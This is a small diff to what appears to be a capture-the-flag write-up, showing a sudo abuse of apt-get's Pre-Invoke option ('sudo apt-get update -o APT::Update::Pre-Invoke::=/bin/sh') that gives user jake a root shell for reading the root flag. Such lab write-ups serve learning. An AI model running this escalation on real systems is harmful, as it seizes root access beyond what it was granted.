@@ -181,7 +181,7 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
 on entering this command, we get 
 
 jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-# whoami
+#whoami
 root
 
 hehehehawww! we have a root shell. now we can read and submit the root.txt flag
